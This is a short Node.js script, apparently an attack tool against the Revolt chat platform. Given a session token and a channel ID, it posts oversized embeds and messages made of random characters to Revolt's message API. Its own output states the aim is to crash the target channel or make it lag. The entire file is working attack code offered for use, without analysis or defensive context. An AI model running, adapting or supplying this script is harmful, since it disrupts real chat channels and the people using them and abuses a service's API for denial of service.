(async()=>{
    "use strict";

    // Dependencies
    const request = require("request-async")

    // Variables
    const args = process.argv.slice(2)
    const payload = []

    // Functions
    function makePayload(){
        var payload = String.fromCharCode(Math.floor(Math.random() * 9999))
        for( let i = 0; i <= 998; i++ ) payload += `\n${String.fromCharCode(Math.floor(Math.random() * 9999))}`
        return payload
    }

    function makeTitlePayload(){
        var payload = String.fromCharCode(Math.floor(Math.random() * 9999))
        for( let i = 0; i <= 70; i++ ) payload += String.fromCharCode(Math.floor(Math.random() * 9999))
        return payload
    }
    
    // Main
    if(!args.length) return console.log("usage: node index.js <token> <channelID>")

    console.log("Note: Phase 1 is enough to crash the channel, the phase 2 is just a backup to make sure It crashes though phase 2 enough will not be able to crash the channel but It can make it lag.")

    console.log("Phase 1")
    console.log("-------------------------------------")
    for( let i = 0; i <= 9; i++ ) payload.push({ title: makeTitlePayload(), description: makePayload(), color: "#$%" })

    for( let i = 0; i <= 10; i++ ){
        var response = await request.post(`https://api.revolt.chat/channels/${args[1]}/messages`, {
            headers: {
                "content-type": "application/json",
                "x-session-token": args[0]
            },
            body: JSON.stringify({ nonce: `AAAAAAAAAAAAAAA${Math.floor(Math.random() * 9999999)}`, embeds: payload })
        })

        console.log(`Payload sent(Size): ${response.body.length}`)
        console.log(response.statusCode)
    }
    
    console.log("-------------------------------------")
    console.log("Phase 2")
    console.log("-------------------------------------")
    for( let i = 0; i <= 2; i++ ){
        var response = await request.post(`https://api.revolt.chat/channels/${args[1]}/messages`, {
            headers: {
                "content-type": "application/json",
                "x-session-token": args[0]
            },
            body: JSON.stringify({ nonce: `AAAAAAAAAAAAAAA${Math.floor(Math.random() * 9999999)}`, content: makePayload() })
        })
    
        console.log(`Payload sent(Size): ${response.body.length}`)
        console.log(response.statusCode)
    }
})()